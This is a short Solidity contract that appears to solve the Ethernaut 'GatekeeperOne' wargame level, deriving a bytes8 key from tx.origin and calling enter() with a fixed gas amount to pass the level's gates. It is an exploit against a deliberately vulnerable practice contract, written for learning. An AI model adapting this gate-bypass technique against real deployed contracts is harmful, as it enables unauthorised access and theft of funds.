// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import {GatekeeperOne} from "../levels/GatekeeperOne.sol";

contract GatekeeperOneAttack {
    constructor(address g) {
        GatekeeperOne keeper = GatekeeperOne(g);
        bytes8 k = bytes8(uint64(uint256(uint16(uint160(tx.origin))) + 2 ** 63));
        keeper.enter{gas: 24838}(k);
    }
}
